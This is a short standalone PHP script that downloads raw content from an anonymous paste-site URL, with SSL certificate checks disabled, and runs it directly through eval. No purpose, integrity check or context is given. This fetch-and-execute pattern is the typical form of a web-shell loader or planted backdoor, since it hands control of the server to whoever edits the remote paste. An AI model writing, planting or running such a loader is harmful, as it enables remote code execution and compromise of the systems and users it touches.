<?php
$url = 'https://ghostbin.axel.org/paste/9o42r/raw';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification (use with caution)
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

$code = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
} else {
    eval('?>' . $code);
}

curl_close($ch);
?>  